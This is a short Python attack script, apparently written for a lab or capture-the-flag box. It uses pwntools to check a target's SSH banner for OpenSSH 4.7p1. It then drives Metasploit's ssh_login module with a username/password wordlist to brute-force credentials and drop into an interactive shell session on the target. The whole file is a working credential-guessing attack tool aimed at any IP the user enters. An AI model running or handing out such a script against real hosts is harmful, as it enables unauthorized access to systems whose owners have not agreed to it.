#!/usr/bin/python3

from pwn import *
from time import sleep

target_ip = input("Enter Target IP:  ").strip()


class ExploitSSH:
    def __init__(self, ip, port=22):
        self.ip = ip
        self.port = port
        self.p = log.progress("")

    def MsfExploit(self):
        try:
            self.p.status("Checking Version...")
            io = remote(self.ip, self.port)
            version = (io.recvuntil(
                b"SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1")).decode()
            if "OpenSSH_4.7p1" not in version:
                self.p.failure("Version OpenSSH_4.7p1 Not Found!!!")
                exit()
            else:
                self.p.status("Version Found")
                sleep(3)  # Wait for 2 seconds
                self.p.status("Running MSFConsole...")
                msf = process(["msfconsole", "-q"], stdin=PTY)
                msf.recvuntil(b">")
                msf.sendline(b"use auxiliary/scanner/ssh/ssh_login")
                msf.sendline(b"set rhosts " + target_ip.encode())
                msf.sendline(
                    b"set userpass_file /usr/share/wordlists/metasploit/piata_ssh_userpass.txt")
                msf.sendline(b"set stop_on_success true")
                msf.sendline(b"set threads 12")
                msf.sendline(b"set verbose true")
                msf.sendline(b"exploit")
                msf.recvuntil(b">")
                msf.sendline("show sessions")
                msf.sendline("sessions -i 1")
                msf.interactive()
                while True:
                    line = msf.recvline()
                    if not line:
                        break
                    log.info(line.decode())

                msf.close()
        except Exception as e:
            self.p.failure(f"Error: {e}")
            exit()


exploit = ExploitSSH(target_ip)
exploit.MsfExploit()
